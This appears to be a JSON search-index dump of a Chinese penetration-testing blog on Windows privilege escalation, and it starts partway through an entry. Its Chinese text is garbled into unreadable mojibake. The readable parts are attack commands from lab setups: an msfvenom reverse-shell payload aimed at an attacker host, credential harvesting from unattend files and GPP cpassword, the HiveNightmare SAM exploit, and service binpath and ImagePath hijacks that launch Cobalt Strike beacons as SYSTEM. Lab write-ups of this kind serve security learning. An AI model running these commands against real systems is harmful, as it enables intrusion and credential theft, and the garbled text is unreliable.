¼å¼çš„åº”ç”¨ç¨‹åºå®‰è£…åŒ…ï¼Œå®é™…ä¸Šæ˜¯ä¸€ä¸ªæ•°æ®åº“ï¼ŒåŒ…å«å®‰è£…å’Œå¸è½½æ—¶éœ€è¦ä½¿ç”¨çš„å¤§é‡æŒ‡ä»¤å’Œç¨‹åºæ•°æ®\nç¯å¢ƒå‡†å¤‡ ä»¥adminæƒé™é…ç½®ï¼š\nwin+rï¼Œgpedit.mscæ‰“å¼€ç»„ç­–ç•¥ç®¡ç†å™¨ï¼Œæ‰¾åˆ°å§‹ç»ˆä»¥æå‡çš„æƒé™è¿›è¡Œå®‰è£…ï¼š\nè®¡ç®—æœºé…ç½®--\u0026gt;ç®¡ç†æ¨¡æ¿--\u0026gt;Windows ç»„ä»¶--\u0026gt;Windows Installer ç¼–è¾‘â€œå§‹ç»ˆä»¥æå‡çš„æƒé™è¿›è¡Œå®‰è£…â€ä¸ºå¼€å¯ï¼š\nåŒæ ·åœ¨ç”¨æˆ·é…ç½®ä¸­ä¹Ÿè¦é…ç½®ï¼š\nå†åœ¨è®¡ç®—æœºé…ç½®ä¸­è®¾ç½®æ™®é€šç¨‹åºçš„å®‰è£…å¯è¡Œæ€§ï¼š\nå¦‚æœæœªæˆåŠŸï¼Œè¿˜å¯ä»¥ç”¨å‘½ä»¤ä¿®æ”¹ä¸‹ï¼š\nreg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f reg add HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f å†éªŒè¯ä¸€ä¸‹é…ç½®æ˜¯å¦æˆåŠŸï¼š\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated ææƒå®éªŒ msf å…ˆç”¨MSFè·å–apacheç”¨æˆ·çš„ä¼šè¯ï¼š\nmsfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.111.128 LPORT=7890 -f exe -o payload.exe å½“å‰shellæƒé™ä¸ºapache\nä½¿ç”¨æ³¨å†Œè¡¨å‘½ä»¤æˆ–ä½¿ç”¨winpeasæŸ¥è¯¢åˆ°å¯ç”¨äº†AlwaysInstallElevatedç­–ç•¥ï¼š\n"
    }
,
    {
        "title": "windowsææƒ-ç”¨æˆ·å‡­æ®æ“ä½œ",
        "link": "/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%E6%8F%90%E6%9D%83/windows%E6%8F%90%E6%9D%83-%E7%94%A8%E6%88%B7%E5%87%AD%E6%8D%AE%E6%93%8D%E4%BD%9C/",
        "content": "windowsææƒ-ç”¨æˆ·å‡­æ®æ“ä½œ æšä¸¾Unattendedå‡­æ® æ— äººå€¼å®ˆï¼ˆUnattendedï¼‰å®‰è£…å…è®¸åº”ç”¨ç¨‹åºåœ¨ä¸éœ€è¦ç®¡ç†å‘˜å…³æ³¨çš„æƒ…å†µä¸‹è‡ªåŠ¨å®‰è£…\nä½†è¿™æ ·ä¼šå¯¼è‡´ç³»ç»Ÿä¸­æ®‹ç•™ä¸€äº›é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­å¯èƒ½åŒ…å«æœ¬åœ°ç®¡ç†å‘˜çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œå¸¸è§è·¯å¾„ï¼š\nC:\\sysprep.inf C:\\syspreg\\sysprep.xml C:\\Windows\\system32\\sysprep.inf C:\\windows\\system32\\sysprep\\sysprep.xml C:\\unattend.xml C:\\Windows\\Panther\\Unattend.xml C:\\Windows\\Panther\\Unattended.xml C:\\Windows\\Panther\\Unattend\\Unattended.xml C:\\Windows\\Panther\\Unattend\\Unattend.xml C:\\Windows\\System32\\Sysprep\\Unattend.xml C:\\Windows\\System32\\Sysprep\\Panther\\Unattend.xml æˆ‘ä»¬å¯ä»¥å…¨ç›˜æœç´¢è¿™äº›æ–‡ä»¶\ndir /b /s c:\\unattend.xml å½“ç„¶ï¼Œmsfæä¾›äº†enum_unattendæ¨¡å—ï¼Œå¯ä»¥ä»unattendé…ç½®æ–‡ä»¶ä¸­è‡ªåŠ¨åŒ–æ£€ç´¢ç”¨æˆ·å¯†ç \nè·å–ç»„ç­–ç•¥å‡­æ® SYSVOL æ˜¯æ´»åŠ¨ç›®å½•é‡Œçš„ä¸€ä¸ªç”¨äºå­˜å‚¨åŸŸå…¬å…±æ–‡ä»¶æœåŠ¡å™¨å‰¯æœ¬çš„å…±äº«æ–‡ä»¶å¤¹ï¼Œåœ¨åŸŸä¸­çš„æ‰€æœ‰åŸŸæ§ä¹‹é—´è¿›è¡Œå¤åˆ¶ï¼ŒSYSVOL åœ¨æ‰€æœ‰ç»è¿‡èº«ä»½éªŒè¯çš„åŸŸç”¨æˆ·æˆ–è€…åŸŸä¿¡ä»»ç”¨æˆ·å…·æœ‰è¯»æƒé™çš„æ´»åŠ¨ç›®å½•åŸŸèŒƒå›´å†…å…±äº«ï¼Œæ‰€æœ‰çš„åŸŸç­–ç•¥å‡å­˜æ”¾åœ¨ C:\\Windows\\SYSVOL\\DOMAIN\\Policies\\ ç›®å½•ä¸­ã€‚\nç®¡ç†å‘˜åœ¨åŸŸä¸­æ–°å»ºä¸€ä¸ªç»„ç­–ç•¥åï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨åœ¨ SYSVOL ç›®å½•ä¸­ç”Ÿæˆä¸€ä¸ª XML æ–‡ä»¶\nè¯¥æ–‡ä»¶ä¸­ä¿å­˜äº†è¯¥ç»„ç­–ç•¥æ›´æ–°åçš„å¯†ç ï¼Œè¯¥å¯†ç ä½¿ç”¨ AES-256 ç®—æ³•ï¼Œä½† 2012 å¹´å¾®è½¯å…¬å¸ƒäº†è¯¥å¯†ç çš„ç§é’¥ï¼Œä¹Ÿå°±æ˜¯è¯´ä»»ä½•äººéƒ½å¯ä»¥å¯¹å…¶è¿›è¡Œè§£å¯†\nåœ¨ç›®å½•ä¸­æœç´¢å³å¯ï¼š\nfindstr /s /i \u0026#34;cpassword\u0026#34; C:\\Windows\\SYSVOL\\*.xml ç„¶åæ‰¾åˆ°cpasswordçš„å€¼è§£å¯†\nGpprefdecrypt.py ä¸‹è½½åœ°å€ï¼šhttps://raw.githubusercontent.com/leonteale/pentestpackage/master/Gpprefdecrypt.py\npython2.7 Gpprefdecrypt.py Wdkeu1drbxqPJm7YAtPtwBtyzcqO88hJUBDD2eseoY0 ä½¿ç”¨ **msf **çš„ post/windows/gather/credentials/gpp æ¨¡å—ä¹Ÿå¯ä»¥æœç´¢cpasswordå¹¶è§£å¯†\nHiveNightmare å’Œæˆ‘ä¹‹å‰çœ‹è§çš„å·å½±æ‹·è´è·å–ntds.ditåŸç†ç›¸ä¼¼ï¼Œä»»ä½•æ ‡å‡†ç”¨æˆ·éƒ½å¯ä»¥ä»å·å½±å‰¯æœ¬ä¸­è¯»å–åŒ…æ‹¬SAMã€SYSTEMã€SECURITYåœ¨å†…çš„å¤šä¸ªç³»ç»Ÿæ–‡ä»¶ï¼Œè¿›è€Œä»SAMè·å–HTLM hashï¼Œç ´è§£åå¯ä»¥å®ç°æƒé™æå‡\nä½æƒé™cmdæ£€æµ‹æ˜¯å¦å­˜åœ¨æ¼æ´ï¼š\nicacls c:\\windows\\system32\\config\\sam è‹¥è¾“å‡ºç»“æœæ˜¯ï¼šBUILTIN\\USERS:(I)(RX)ï¼Œè¡¨æ˜å­˜åœ¨æ¼æ´ï¼ˆRXä»£è¡¨[READ/EXecuteæƒé™ï¼‰\nEXPä¸‹è½½åœ°å€ï¼šhttps://github.com/GossiTheDog/HiveNightmare ä½œè€…å·²ç»ç¼–è¯‘å¥½çš„åˆ©ç”¨è„šæœ¬ä¸‹è½½åœ°å€ï¼šhttps://github.com/GossiTheDog/HiveNightmare/releases/tag/0.6\nç›´æ¥å°†ä½œè€…ç¼–è¯‘å¥½çš„ HiveNightmare.exe æ‹·è´åˆ°ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œå³å¯\nå…¶ä»– å…¶ä»–çš„åŸŸå†…ææƒæ‰‹æ³•æ€»ç»“åœ¨æˆ‘çš„å¦ä¸€ç¯‡æ–‡ç« \n",
        "summary": "windowsææƒ-ç”¨æˆ·å‡­æ®æ“ä½œ æšä¸¾Unattendedå‡­æ® æ— äººå€¼å®ˆï¼ˆUnattendedï¼‰å®‰è£…å…è®¸åº”ç”¨ç¨‹åºåœ¨ä¸éœ€è¦ç®¡ç†å‘˜å…³æ³¨çš„æƒ…å†µä¸‹è‡ªåŠ¨å®‰è£…\nä½†è¿™æ ·ä¼šå¯¼è‡´ç³»ç»Ÿä¸­æ®‹ç•™ä¸€äº›é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­å¯èƒ½åŒ…å«æœ¬åœ°ç®¡ç†å‘˜çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œå¸¸è§è·¯å¾„ï¼š\nC:\\sysprep.inf C:\\syspreg\\sysprep.xml C:\\Windows\\system32\\sysprep.inf C:\\windows\\system32\\sysprep\\sysprep.xml C:\\unattend.xml C:\\Windows\\Panther\\Unattend.xml C:\\Windows\\Panther\\Unattended.xml C:\\Windows\\Panther\\Unattend\\Unattended.xml C:\\Windows\\Panther\\Unattend\\Unattend.xml C:\\Windows\\System32\\Sysprep\\Unattend.xml C:\\Windows\\System32\\Sysprep\\Panther\\Unattend.xml æˆ‘ä»¬å¯ä»¥å…¨ç›˜æœç´¢è¿™äº›æ–‡ä»¶\ndir /b /s c:\\unattend.xml å½“ç„¶ï¼Œmsfæä¾›äº†enum_unattendæ¨¡å—ï¼Œå¯ä»¥ä»unattendé…ç½®æ–‡ä»¶ä¸­è‡ªåŠ¨åŒ–æ£€ç´¢ç”¨æˆ·å¯†ç \nè·å–ç»„ç­–ç•¥å‡­æ® SYSVOL æ˜¯æ´»åŠ¨ç›®å½•é‡Œçš„ä¸€ä¸ªç”¨äºå­˜å‚¨åŸŸå…¬å…±æ–‡ä»¶æœåŠ¡å™¨å‰¯æœ¬çš„å…±äº«æ–‡ä»¶å¤¹ï¼Œåœ¨åŸŸä¸­çš„æ‰€æœ‰åŸŸæ§ä¹‹é—´è¿›è¡Œå¤åˆ¶ï¼ŒSYSVOL åœ¨æ‰€æœ‰ç»è¿‡èº«ä»½éªŒè¯çš„åŸŸç”¨æˆ·æˆ–è€…åŸŸä¿¡ä»»ç”¨æˆ·å…·æœ‰è¯»æƒé™çš„æ´»åŠ¨ç›®å½•åŸŸèŒƒå›´å†…å…±äº«ï¼Œæ‰€æœ‰çš„åŸŸç­–ç•¥å‡å­˜æ”¾åœ¨ C:\\Windows\\SYSVOL\\DOMAIN\\Policies\\ ç›®å½•ä¸­ã€‚\nç®¡ç†å‘˜åœ¨åŸŸä¸­æ–°å»ºä¸€ä¸ªç»„ç­–ç•¥åï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨åœ¨ SYSVOL ç›®å½•ä¸­ç”Ÿæˆä¸€ä¸ª XML æ–‡ä»¶\nè¯¥æ–‡ä»¶ä¸­ä¿å­˜äº†è¯¥ç»„ç­–ç•¥æ›´æ–°åçš„å¯†ç ï¼Œè¯¥å¯†ç ä½¿ç”¨ AES-256 ç®—æ³•ï¼Œä½† 2012 å¹´å¾®è½¯å…¬å¸ƒäº†è¯¥å¯†ç çš„ç§é’¥ï¼Œä¹Ÿå°±æ˜¯è¯´ä»»ä½•äººéƒ½å¯ä»¥å¯¹å…¶è¿›è¡Œè§£å¯†\nåœ¨ç›®å½•ä¸­æœç´¢å³å¯ï¼š\nfindstr /s /i \u0026#34;cpassword\u0026#34; C:\\Windows\\SYSVOL\\*.xml ç„¶åæ‰¾åˆ°cpasswordçš„å€¼è§£å¯†\nGpprefdecrypt.py ä¸‹è½½åœ°å€ï¼šhttps://raw.githubusercontent.com/leonteale/pentestpackage/master/Gpprefdecrypt.py\npython2.7 Gpprefdecrypt.py Wdkeu1drbxqPJm7YAtPtwBtyzcqO88hJUBDD2eseoY0 ä½¿ç”¨ **msf **çš„ post/windows/gather/credentials/gpp æ¨¡å—ä¹Ÿå¯ä»¥æœç´¢cpasswordå¹¶è§£å¯†\nHiveNightmare å’Œæˆ‘ä¹‹å‰çœ‹è§çš„å·å½±æ‹·è´è·å–ntds.ditåŸç†ç›¸ä¼¼ï¼Œä»»ä½•æ ‡å‡†ç”¨æˆ·éƒ½å¯ä»¥ä»å·å½±å‰¯æœ¬ä¸­è¯»å–åŒ…æ‹¬SAMã€SYSTEMã€SECURITYåœ¨å†…çš„å¤šä¸ªç³»ç»Ÿæ–‡ä»¶ï¼Œè¿›è€Œä»SAMè·å–HTLM hashï¼Œç ´è§£åå¯ä»¥å®ç°æƒé™æå‡\nä½æƒé™cmdæ£€æµ‹æ˜¯å¦å­˜åœ¨æ¼æ´ï¼š\nicacls c:\\windows\\system32\\config\\sam è‹¥è¾“å‡ºç»“æœæ˜¯ï¼šBUILTIN\\USERS:(I)(RX)ï¼Œè¡¨æ˜å­˜åœ¨æ¼æ´ï¼ˆRXä»£è¡¨[READ/EXecuteæƒé™ï¼‰\n"
    }
,
    {
        "title": "Windowsææƒ-ç³»ç»ŸæœåŠ¡ææƒ",
        "link": "/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%E6%8F%90%E6%9D%83/windows%E6%8F%90%E6%9D%83-%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83/",
        "content": "Windowsææƒ-ç³»ç»ŸæœåŠ¡ææƒ ç”¨æˆ·å®‰è£…çš„ä¸€äº›è½¯ä»¶ä¼šåœ¨æœ¬åœ°æ³¨å†Œä¸€äº›æœåŠ¡ï¼Œå¤§å¤šæ•°æœåŠ¡åœ¨è®¡ç®—æœºå¼€æœºæ—¶ä»¥ç³»ç»Ÿsystemæƒé™å¯åŠ¨ï¼Œåº”ç”¨è½¯ä»¶åœ¨æ³¨å†ŒæœåŠ¡æ—¶ä¼šåœ¨ä»¥ä¸‹è·¯å¾„åˆ›å»ºå¯¹åº”æ³¨å†Œè¡¨é¡¹ï¼š\nè®¡ç®—æœº\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services å…¶ä¸­æœåŠ¡çš„imagepathæŒ‡å‘ç³»ç»ŸæœåŠ¡å¯åŠ¨çš„äºŒè¿›åˆ¶ç¨‹åºï¼š\nè¿™é‡Œä¾¿äº§ç”Ÿä¸€ç§ææƒçš„æ€è·¯ï¼š\nç”±äºå¤§å¤šæ•°ç³»ç»ŸæœåŠ¡æ˜¯systemæƒé™å¯åŠ¨ï¼Œå¦‚æœè®©æœåŠ¡å¯åŠ¨æ—¶æ‰§è¡Œå…¶ä»–ç¨‹åºï¼Œè¯¥ç¨‹åºå°±å¯ä»¥éšç€æœåŠ¡çš„å¯åŠ¨è·å¾—ç³»ç»Ÿæƒé™ï¼Œè¾¾åˆ°ææƒç›®å½•\nè¿™ç±»ææƒå¾€å¾€æ˜¯ç”¨æˆ·é…ç½®ä¸å½“å¯¼è‡´çš„ï¼Œæ¥ä¸‹æ¥åˆ†ç±»ç»†è¯´\næœåŠ¡é…ç½®æƒé™è„†å¼± windowsçš„ç³»ç»ŸæœåŠ¡é€šè¿‡ACLæ¥æŒ‡å®šç”¨æˆ·å¯¹å…¶æ‹¥æœ‰çš„æƒé™ï¼Œå¸¸è§æƒé™å¦‚ä¸‹ï¼š\nå¦‚æœç›®æ ‡ä¸»æœºçš„ç”¨æˆ·åœ¨é…ç½®æœåŠ¡æ—¶å­˜åœ¨ç–å¿½ï¼Œä½¿ä½æƒé™ç”¨æˆ·å¯¹é«˜æƒé™ä¸‹è¿è¡Œçš„ç³»ç»ŸæœåŠ¡æ‹¥æœ‰æ›´æ”¹æœåŠ¡é…ç½®çš„æƒé™ï¼ˆSERVICE_CHANGE_CONFIGæˆ–SERVICE_ALL_ACCESSï¼‰ï¼Œå³å¯é€šè¿‡è¯¥ä½æƒé™ç”¨æˆ·ä¿®æ”¹æœåŠ¡å¯åŠ¨æ—¶çš„äºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„ï¼Œé€šè¿‡ä¿®æ”¹æœåŠ¡å¯åŠ¨æ–‡ä»¶çš„è·¯å¾„â€œ binpathâ€ï¼Œå°†å…¶æ›¿æ¢ä¸ºæ¶æ„ç¨‹åºçš„è·¯å¾„ï¼Œè¿™æ ·æœåŠ¡å¯åŠ¨æ—¶ä¾¿ä¼šè¿è¡Œæ¶æ„ç¨‹åº\nå­˜åœ¨ç¼ºé™·çš„ç³»ç»ŸæœåŠ¡å¯ä»¥é€šè¿‡AccessChkæ¥æšä¸¾ï¼š\nAccessChkå·¥å…·å¯ä»¥æšä¸¾ç›®æ ‡ä¸»æœºä¸Šå­˜åœ¨æƒé™ç¼ºé™·çš„ç³»ç»ŸæœåŠ¡ã€‚AccessChkæ˜¯å¾®è½¯å®˜æ–¹æä¾›çš„ç®¡ç†å·¥å…·ï¼Œå¸¸ç”¨æ¥æšä¸¾æˆ–æŸ¥çœ‹ç³»ç»Ÿä¸­æŒ‡å®šç”¨æˆ·ã€ç»„å¯¹ç‰¹å®šèµ„æº(åŒ…æ‹¬ä½†ä¸é™äºæ–‡ä»¶ã€æ–‡ä»¶å¤¹ã€æ³¨å†Œè¡¨ã€å…¨å±€å¯¹è±¡å’Œç³»ç»ŸæœåŠ¡ç­‰)çš„è®¿é—®æƒé™\nä½æƒé™ç”¨æˆ·å¯ä»¥æ£€æŸ¥â€œAuthenticated Usersâ€ç»„å’Œâ€œINTERACTIVEâ€ç»„å¯¹ç³»ç»ŸæœåŠ¡çš„æƒé™ï¼Œå‰è€…ä¸ºç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·ï¼ŒåŒ…å«ç³»ç»Ÿä¸­æ‰€æœ‰ä½¿ç”¨ç”¨æˆ·åã€å¯†ç ç™»å½•å¹¶é€šè¿‡èº«ä»½éªŒè¯çš„è´¦æˆ·ï¼Œä½†ä¸åŒ…æ‹¬æ¥å®¾è´¦æˆ·ï¼Œåè€…ä¸ºäº¤äº’å¼ç”¨æˆ·ç»„ï¼ŒåŒ…å«ç³»ç»Ÿä¸­æ‰€æœ‰ç›´æ¥ç™»å½•åˆ°è®¡ç®—æœºè¿›è¡Œæ“ä½œçš„ç”¨æˆ·ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™ä¸¤ä¸ªç»„ä¸ºè®¡ç®—æœºæœ¬åœ°â€œUsersâ€ç»„çš„æˆå‘˜\nç¯å¢ƒå‡†å¤‡ ç”¨adminæƒé™é…ç½®ç¯å¢ƒï¼š\nå…ˆå»ºä¸€ä¸ªæœåŠ¡ï¼Œåå­—ä¸ºYuy0ungï¼Œè¿è¡ŒCç›˜ä¸‹çš„1.exeï¼š\nsc create Yuy0ung binpath= \u0026#34;C:\\1.exe\u0026#34; åˆ›å»ºä¸€ä¸ªç”¨æˆ·æ¨¡æ‹Ÿapacheï¼š\nnet user apache Admin123456 /add ä½¿ç”¨ç”¨subinaclï¼ˆéœ€è¦è‡ªå·±ä¸‹è½½ï¼‰ç»™æœåŠ¡è®¾ç½®æƒé™ï¼š\nsubinacl /service Yuy0ung /grant=apache=F ææƒå®éªŒ åˆ‡æ¢åˆ°apcheç”¨æˆ·å¹¶ç”¨CSå®ç°è¿œæ§ï¼š\nä¸Šä¼ accesschkå¹¶æšä¸¾æ˜¯å¦å…·æœ‰apacheç”¨æˆ·å¯æ›´æ”¹çš„æœåŠ¡é…ç½®ï¼š\naccesschk.exe /accepteula -uwcqv apache * è‹¥å¾—åˆ°SERVICE_ALL_ACCESSæˆ–SERVICE_CHANGE_CONFIGå…¶ä¸­ä¹‹ä¸€ï¼Œåˆ™å…è®¸æˆ‘ä»¬é…ç½®æœåŠ¡\n**æ³¨ï¼š**é™¤äº†accesschkï¼Œwinpeasä¹Ÿå¯ä»¥æšä¸¾å‡ºå¯ä»¥ä¿®æ”¹çš„æœåŠ¡é…ç½®\næ›´æ”¹Yuy0ungæœåŠ¡çš„å¯åŠ¨æ–‡ä»¶ï¼Œæ›¿æ¢æˆæ¶æ„çš„æ–‡ä»¶ï¼ˆè¿™é‡Œæˆ‘é€‰æ‹©ä½¿ç”¨ä¸Šä¼ çš„è¿œæ§exeï¼‰ç„¶åææƒï¼š\nsc config Yuy0ung binpath= \u0026#34;C:\\Users\\apache\\Desktop\\artifact.exe\u0026#34; # æ³¨æ„=åé¢æœ‰ä¸ªç©ºæ ¼ æ‰‹åŠ¨å¯åŠ¨æœåŠ¡ï¼š\nsc start Yuy0ung å¯ä»¥çœ‹è§è¿™é‡ŒæˆåŠŸæ¥æ”¶åˆ°äº†systemæƒé™çš„beacon\næœåŠ¡æ³¨å†Œè¡¨æƒé™è„†å¼± Windowsçš„æœåŠ¡è·¯å¾„å­˜å‚¨åœ¨Windowsçš„æ³¨å†Œè¡¨ä¸­ï¼Œè€Œæ³¨å†Œè¡¨ä½¿ç”¨ACLæ¥ç®¡ç†ç”¨æˆ·å¯¹å…¶çš„è®¿é—®æƒé™ï¼Œè‹¥ACLé…ç½®ä¸å½“ï¼Œä½¿ä½æƒé™ç”¨æˆ·å¯ä»¥æ›´æ”¹æ³¨å†Œè¡¨çš„é€‰é¡¹çš„æ—¶å€™ï¼Œå°±å¯ä»¥å¯¼è‡´ææƒï¼Œå¯ä»¥å°† imagepath ä¿®æ”¹æˆæ¶æ„çš„æ–‡ä»¶ï¼Œé‡å¯å¯¼è‡´ææƒ\nç¯å¢ƒå‡†å¤‡ æ–°å»ºä¸€ä¸ªtestæœåŠ¡ï¼š\nsc create test binpath= \u0026#34;C:\\1.exe\u0026#34; æ‰“å¼€æ³¨å†Œè¡¨ç»™è¯¥æ–‡ä»¶æƒé™ï¼Œè·¯å¾„ä¸ºHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\testï¼š\nææƒå®éªŒ ä¾æ—§åˆ‡æ¢è‡³apacheå¹¶ä½¿ç”¨CSä¸Šçº¿ï¼š\næ¥ä¸‹æ¥è¿›è¡Œä¿¡æ¯æœé›†ï¼ˆå¯ç»“åˆwinpeasï¼Œè¿™é‡Œä¸ç»†è¯´ï¼‰\nä½¿ç”¨accesschkæšä¸¾userså…·æœ‰å†™å…¥æƒé™çš„æœåŠ¡æ³¨å†Œè¡¨ï¼š\nshell accesschk.exe /accepteula -uvwqk users HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services å‘ç°testæœåŠ¡æ³¨å†Œè¡¨å¯å†™\npowershelléªŒè¯ä¸€ä¸‹ï¼š\npowershell Get-Acl -Path \u0026#34;HKLM:SYSTEM\\CurrentControlSet\\Services\\test\u0026#34; | fl usersç¡®å®æœ‰å®Œå…¨æ§åˆ¶æƒé™\nè€è§„çŸ©ï¼ŒimagepathæŒ‡å‘çš„æ–‡ä»¶æ›¿æ¢ä¸ºè¿œæ§exeï¼š\nreg add \u0026#34;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\test\u0026#34; /t REG_EXPAND_SZ /v ImagePath /d \u0026#34;C:\\Users\\apache\\Desktop\\artifact.exe\u0026#34; /f æŸ¥çœ‹æœåŠ¡é…ç½®ä¿¡æ¯ï¼š\nsc qc test æ›´æ”¹æˆåŠŸäº†\næ¥ä¸‹æ¥é‡å¯æœåŠ¡å³å¯ï¼ˆè¿™é‡Œæ™®é€šç”¨æˆ·æ˜¯æ²¡æœ‰æƒé™çš„ï¼Œéœ€è¦ç­‰å¾…ç®¡ç†å‘˜é‡å¯ç”µè„‘ï¼‰ï¼š\nsc start test æˆåŠŸè·å–systemæƒé™çš„beacon\næœåŠ¡è·¯å¾„æƒé™è„†å¼± è‹¥ä¸»æœºå­˜åœ¨é”™è¯¯é…ç½®æˆ–æ“ä½œï¼Œä½¿ä¸€ä¸ªä½æƒé™ç”¨æˆ·å¯¹æ­¤æœåŠ¡è°ƒç”¨çš„äºŒè¿›åˆ¶æ–‡ä»¶æˆ–å…¶æ‰€åœ¨ç›®å½•æœ‰å†™æƒé™ï¼Œåˆ™å¯ä»¥å°†è¯¥æ–‡ä»¶æ›¿æ¢ä¸ºæ¶æ„åé—¨æ–‡ä»¶ï¼ŒéšæœåŠ¡å¯åŠ¨ç»§æ‰¿ç³»ç»Ÿæƒé™\nç¯å¢ƒå‡†å¤‡ é¦–å…ˆä½¿ç”¨ç®¡ç†å‘˜è¿›è¡Œé…ç½®ï¼Œåˆ›å»ºä¸€ä¸ªtestæ–‡ä»¶å¤¹C:\\Program Files\\test\nå°†testæ–‡ä»¶å¤¹åŠ å…¥æœåŠ¡ï¼š\nsc create svcpath binpath= \u0026#34;\\\u0026#34;C:\\Program Files\\test\\1.exe\\\u0026#34;\u0026#34; æ›´æ”¹testæ–‡ä»¶å¤¹å¯¹usersçš„æƒé™ä¸ºå®Œå…¨æ§åˆ¶ï¼š\nicacls \u0026#34;C:\\Program Files\\test\u0026#34; /grant Users:(OI)(CI)F /T ææƒå®éªŒ åˆ‡æ¢åˆ°apacheï¼Œå¹¶ä½¿ç”¨CSä¸Šçº¿\nå¯ä¸Šä¼ å¹¶ä½¿ç”¨winpeasï¼ŒæŸ¥æ‰¾å‡ºå¼±æƒé™çš„æœåŠ¡ï¼š\nwinPEASany.exe quiet notcolor serviceinfo å¯ä»¥å‘ç°userså¯¹C:\\Program Files\\test\\1.exeå’ŒC:\\Program Files\\test\\1.exeèƒ½å®Œå…¨æ§åˆ¶\nç›´æ¥å°†1.exeæ›¿æ¢æˆæ¶æ„åé—¨ï¼Œæˆ‘è¿™é‡Œç”¨CSç”Ÿæˆçš„artifact.exeè¿›è¡Œæ›¿æ¢ï¼Œç­‰å¾…æœåŠ¡é‡å¯å³å¯ï¼ˆä¾ç„¶æ˜¯éœ€è¦ç®¡ç†å‘˜æƒé™ï¼‰\næˆåŠŸè·å–systemæƒé™\næœªå¼•ç”¨çš„æœåŠ¡è·¯å¾„ åˆç§°Tusted Service Pathsï¼ŒwindowsæœåŠ¡é€šå¸¸éƒ½æ˜¯ä»¥Systemæƒé™è¿è¡Œçš„ï¼Œæ‰€ä»¥ç³»ç»Ÿåœ¨è§£ææœåŠ¡çš„äºŒè¿›åˆ¶æ–‡ä»¶å¯¹åº”çš„æ–‡ä»¶è·¯å¾„ä¸­çš„ç©ºæ ¼çš„æ—¶å€™ä¹Ÿä¼šä»¥ç³»ç»Ÿæƒé™è¿›è¡Œè§£æã€‚å¦‚æœæˆ‘ä»¬èƒ½åˆ©ç”¨è¿™ä¸€ç‰¹æ€§ï¼Œå°±æœ‰æœºä¼šè¿›è¡Œæƒé™æå‡ã€‚\nå¦‚æœåœ¨æ³¨å†Œè¡¨ä¸­å­˜åœ¨æ²¡æœ‰è¢«å¼•ç”¨èµ·æ¥çš„æœåŠ¡è·¯å¾„ å¦‚æœæ˜¯å¦‚ä¸‹C:\\Program Files\\SomeFolder\\Service.exe å› ä¸º Program Files å’Œ Some Folderéƒ½å­˜åœ¨ç©ºæ ¼ï¼Œå°±å¯èƒ½å­˜åœ¨æˆªæ–­ï¼Œä¾æ¬¡å¯»æ‰¾å¦‚ä¸‹çš„ç¨‹åºå¹¶ä¸”æ‰§è¡Œé˜¶æ®µå¦‚ä¸‹ï¼š\nC:\\Program.exe C:\\Program Files\\Some.exe C:\\Program Files\\Some Folder\\Service.exe æˆ‘ä»¬åªéœ€è¦åœ¨ç›¸åº”çš„ç›®å½•ä¸‹åˆ¶ä½œä¸€ä¸ªæ¶æ„çš„ç¨‹åºï¼Œè¾¾åˆ°ææƒçš„ç›®çš„å³å¯ï¼Œæ‰€ä»¥ææƒçš„æ¡ä»¶å¦‚ä¸‹ï¼š\n1ã€æœåŠ¡è·¯å¾„æ²¡æœ‰ç”¨å¼•å·å¼•èµ·æ¥ 2ã€æœåŠ¡çš„è·¯å¾„ä¸­å­˜åœ¨ç©ºæ ¼ 3ã€æœåŠ¡ä»¥æœ€é«˜æƒé™å¯åŠ¨å 4ã€å…·æœ‰åˆ°å¯¹åº”ç›®å½•ä¸‹å†™æ–‡ä»¶çš„æƒé™ ç¯å¢ƒå‡†å¤‡ é¦–å…ˆåˆ›å»ºä¸€ä¸ªæœåŠ¡ï¼Œæˆ–è€…è‡ªå·±å®‰è£…ä¸€ä¸ªè½¯ä»¶ï¼Œè·¯å¾„ä¸­å­˜åœ¨ç©ºæ ¼ï¼Œå¹¶ä¸”æœåŠ¡çš„è·¯å¾„ä¸­æ²¡æœ‰å¼•å·\nsc create \u0026#34;service\u0026#34; binpath= \u0026#34;C:\\Program Files\\Common Files\\test\\test.exe\u0026#34; start= auto æŸ¥è¯¢æœåŠ¡çš„å¯åŠ¨æ–¹å¼å’Œæƒé™\nsc qc service æ˜¯systemæƒé™å’Œè‡ªå¯åŠ¨\nç»™usersä¸€ä¸ªå†™æƒé™ï¼š\nicacls \u0026#34;C:\u0026#34; /grant \u0026#34;BUILTIN\\Users\u0026#34;:W ææƒå®éªŒ ä½¿ç”¨winpeasæ‰«æå‘ç°æœªå¼•ç”¨çš„æœåŠ¡ï¼š\nwinPEASany.exe quiet notcolor serviceinfo æ£€æŸ¥æƒé™ï¼š\nicacls \u0026#34;C:\u0026#34; icacls \u0026#34;C:\\Program Files\u0026#34; icacls \u0026#34;C:\\Program Files\\Common Files\u0026#34; 